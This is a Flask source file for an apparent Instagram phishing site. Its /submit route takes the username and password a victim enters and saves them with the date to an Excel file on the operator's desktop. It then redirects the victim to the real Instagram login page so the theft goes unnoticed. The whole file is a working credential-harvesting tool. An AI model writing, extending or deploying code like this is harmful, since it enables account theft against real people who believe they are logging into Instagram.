from flask import Flask, render_template, request, redirect, url_for
from datetime import datetime
import pandas as pd
import os

app = Flask(__name__)

# Define constant for file path
DATA_FILE_PATH = os.path.join('C:\\', 'Users', 'HP-2', 'Desktop', 'data.xlsx')

# Function to check if file exists
def file_exists(file_path):
    return os.path.isfile(file_path)

@app.route("/")
def hello():
    return render_template("index.html")

@app.route("/Images/logo.png")
def logo_image():
    urla = url_for("Images", filename="logo.png")
    return render_template('index.html', image=urla)

@app.route("/Images/googlePlay.png")
def google_play_image():
    urlb = url_for("Images", filename="googlePlay.png")
    return render_template('index.html', image=urlb)

@app.route("/Images/microsoft.png")
def microsoft_image():
    urlc = url_for("Images", filename="microsoft.png")
    return render_template('index.html', image=urlc)



@app.route("/submit", methods=["POST"])
def submit():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]
        Date = datetime.now().strftime("%d/%m/%Y")
        
        # Check if the file exists
        if file_exists(DATA_FILE_PATH):
            existing_data = pd.read_excel(DATA_FILE_PATH)
        else:
            existing_data = pd.DataFrame()
        
        # Create new data frame
        new_data = pd.DataFrame({
            'Username': [username],
            'Password': [password],
            'Date': [Date]
        })
        
        # Combine existing and new data
        combined_data = pd.concat([existing_data, new_data], ignore_index=True)
        
        try:
            # Save data to Excel file
            combined_data.to_excel(DATA_FILE_PATH, index=False)
            print("Data saved to Excel file:", DATA_FILE_PATH)
            # Redirect to legitimate Instagram page
            return redirect("https://www.instagram.com/accounts/login/?next=https%3A%2F%2Fwww.instagram.com%2Flogin%2F&source=logged_out_half_sheet")
        except Exception as e:
            print("Error:", e)
            # Redirect to index page on error
            return render_template("index.html", error="An error occurred while processing your request.")
    else:
        return "Method not allowed"

if __name__ == '__main__':
    app.run(debug=True)
